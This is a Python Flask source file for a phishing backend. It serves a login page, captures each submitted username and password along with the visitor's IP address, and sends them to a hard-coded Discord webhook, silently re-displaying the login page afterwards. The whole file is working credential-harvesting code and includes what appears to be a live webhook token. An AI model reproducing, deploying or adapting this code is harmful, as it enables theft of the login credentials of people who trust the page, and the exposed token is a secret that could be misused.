from flask import Flask, render_template, request, jsonify
from discord_webhook import DiscordWebhook
import smtplib
import requests


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.form.get('send_username')
    password = request.form.get('send_password')
    ip_addr = request.headers.get('X-Real-IP')
    try:
        login_info = ("""Username ```{}``` password ```{}``` Ip_Address ```{}```""").format(username, password, ip_addr)

        hook = ("https://discord.com/api/webhooks/901158074906206218/x-bE5mVPAHZOXRxWYUKSqVz-pBZ0z7HY2tKBcOug2aqsjU_uzWNKuFqlvRhU8vhiV7yA")
        msg = str(login_info)
        webhook = DiscordWebhook(url= str(hook), content= msg,)
        response = webhook.execute()

        return render_template('login.html')
    except:
        return render_template('login.html')

if __name__ == '__main__':
    app.run()